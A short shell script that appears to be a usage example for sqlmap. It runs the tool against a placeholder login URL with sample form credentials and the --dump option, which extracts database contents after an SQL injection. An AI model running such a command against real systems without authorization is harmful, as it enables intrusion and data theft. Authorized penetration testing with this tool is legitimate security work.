echo "Starting SQLMap Example..."

# Replace the target URL with your target URL
TARGET_URL="http://example.com/login.php"

# Example SQLMap command to check for SQL Injection vulnerability
sqlmap -u "$TARGET_URL" \
  --data="username=admin&password=12345" \
  --level=3 \
  --risk=2 \
  --dump

echo "SQLMap Example Completed. Check the output for results."
